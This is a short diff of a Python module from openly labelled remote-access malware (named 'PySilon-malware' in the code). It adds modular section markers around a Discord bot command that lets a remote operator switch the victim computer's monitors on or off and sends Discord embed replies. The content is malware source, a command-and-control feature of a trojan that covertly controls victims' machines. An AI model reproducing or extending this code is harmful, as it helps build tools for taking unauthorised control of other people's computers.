@@ -1,9 +1,14 @@
+#<imports>
 import monitorcontrol
 import threading
+import discord
+#</imports>
 
-global monitors_off
+#<preload>
 monitors_off = False
+#</preload>
 
+#<command>
 @client.command(name="monitors")
 async def monitor_control(ctx, state=None):
     global monitors_off
@@ -46,3 +51,4 @@ async def monitor_control(ctx, state=None):
         embed = discord.Embed(title="🔴 Hold on!",description=f'```Syntax: .monitors <on / off>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
+#</command>
